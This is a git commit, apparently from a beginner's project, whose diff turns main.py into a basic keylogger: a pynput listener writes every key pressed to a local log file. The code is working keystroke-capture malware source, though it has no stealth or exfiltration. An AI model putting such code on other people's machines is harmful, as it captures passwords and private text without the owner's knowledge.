b1eec6b228fb9692fe4a3cc6c0d6978c85f74ef8
Abhiram-rp <abhiramrp081@gmail.com>
2025-11-23 12:45:31 +0530

    First stage of keylogger

--- main.py
+++ main.py
@@ -2,5 +2,27 @@
 
 # using the 'with' kwyword releases the memory automatically
 
-with open("Keylogger/log.txt",'a') as f:
-    f.write("Appending with the 'with' keyword now")
+
+from pynput.keyboard import Listener
+
+def write_To_File(key):
+
+    letter = str(key) #converting to string type
+    letter =letter.replace("'","")
+
+    if(letter == 'Key.space'):
+        letter= ' '
+
+    if(letter == 'Key.shift' or letter == 'Key.shift_r'):
+        letter = ''
+
+    if(letter == 'Key.enter'):
+        letter = '\n'
+
+    with open("Keylogger/log.txt",'a') as f:
+        f.write(letter)
+
+
+
+with Listener(on_press=write_To_File) as l:
+    l.join()
